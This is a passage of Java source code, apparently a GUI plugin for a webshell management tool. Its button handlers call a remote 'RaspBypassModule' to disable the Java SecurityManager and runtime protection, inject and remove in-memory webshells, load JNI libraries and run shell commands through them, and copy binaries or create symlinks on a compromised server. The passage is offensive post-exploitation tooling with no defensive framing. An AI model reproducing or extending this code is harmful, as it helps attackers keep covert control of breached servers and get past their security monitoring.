        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("action", "clearSecurityManager");

            byte[] result = this.payload.evalFunc("RaspBypassModule", "universalRaspDisable", params);
            String strResult = new String(result);
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void injectMemShellButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.memShellResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String shellType = (String) this.memShellTypeCombo.getSelectedItem();
        String urlPath = this.memShellPathTextField.getText().trim();

        this.memShellResultTextArea.append("========================================\n");
        this.memShellResultTextArea.append("\u6b63\u5728\u6ce8\u5165\u5185\u5b58\u9a6c\u2026\n");
        this.memShellResultTextArea.append("\u7c7b\u578b: " + shellType + "\n");
        this.memShellResultTextArea.append("\u8def\u5f84: " + urlPath + "\n");
        this.memShellResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("shellType", shellType);
            params.add("type", shellType);
            params.add("urlPath", urlPath);
            params.add("path", urlPath);
            params.add("uri", urlPath);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "injectMemShell", params);
            String strResult = new String(result);
            this.memShellResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.memShellResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void removeMemShellButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.memShellResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String shellType = (String) this.memShellTypeCombo.getSelectedItem();

        this.memShellResultTextArea.append("========================================\n");
        this.memShellResultTextArea.append("\u6b63\u5728\u79fb\u9664\u5185\u5b58\u9a6c\u2026\n");
        this.memShellResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("shellType", shellType);
            params.add("type", shellType);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "removeMemShell", params);
            String strResult = new String(result);
            this.memShellResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.memShellResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void loadJniButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.jniResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String soPath = this.jniSoPathTextField.getText().trim();

        this.jniResultTextArea.append("========================================\n");
        this.jniResultTextArea.append("\u6b63\u5728\u52a0\u8f7d JNI \u5e93\u2026\n");
        this.jniResultTextArea.append("\u8def\u5f84: " + soPath + "\n");
        this.jniResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("soPath", soPath);
            params.add("path", soPath);
            params.add("jniPath", soPath);
            params.add("libraryPath", soPath);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "loadJniLibrary", params);
            String strResult = new String(result);
            this.jniResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.jniResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void execJniButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.jniResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String cmd = this.jniCmdTextField.getText().trim();

        this.jniResultTextArea.append("========================================\n");
        this.jniResultTextArea.append("\u901a\u8fc7 JNI \u6267\u884c\u2026\n");
        this.jniResultTextArea.append("\u547d\u4ee4: " + cmd + "\n");
        this.jniResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("cmd", cmd);
            params.add("cmdLine", cmd);
            params.add("command", cmd);
            params.add("commandLine", cmd);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "execViaJni", params);
            String strResult = new String(result);
            this.jniResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.jniResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void copyBashButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.toolsResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String srcPath = this.sourcePathTextField.getText().trim();
        String dstPath = this.destPathTextField.getText().trim();

        this.toolsResultTextArea.append("========================================\n");
        this.toolsResultTextArea.append("\u6b63\u5728\u590d\u5236\u4e8c\u8fdb\u5236\u2026\n");
        this.toolsResultTextArea.append("\u6e90: " + srcPath + "\n");
        this.toolsResultTextArea.append("\u76ee\u6807: " + dstPath + "\n");
        this.toolsResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("srcPath", srcPath);
            params.add("dstPath", dstPath);
            params.add("source", srcPath);
            params.add("target", dstPath);
            params.add("sourcePath", srcPath);
            params.add("destPath", dstPath);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "copyBinary", params);
            String strResult = new String(result);
            this.toolsResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.toolsResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void createLinkButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.toolsResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String srcPath = this.sourcePathTextField.getText().trim();
        String dstPath = this.destPathTextField.getText().trim();

        this.toolsResultTextArea.append("========================================\n");
        this.toolsResultTextArea.append("\u6b63\u5728\u521b\u5efa\u7b26\u53f7\u94fe\u63a5\u2026\n");
        this.toolsResultTextArea.append("\u6e90: " + srcPath + "\n");
        this.toolsResultTextArea.append("\u76ee\u6807: " + dstPath + "\n");
        this.toolsResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("srcPath", srcPath);
            params.add("dstPath", dstPath);
            params.add("source", srcPath);
            params.add("target", dstPath);
            params.add("sourcePath", srcPath);
            params.add("destPath", dstPath);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "createSymlink", params);
            String strResult = new String(result);
            this.toolsResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.toolsResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }
}
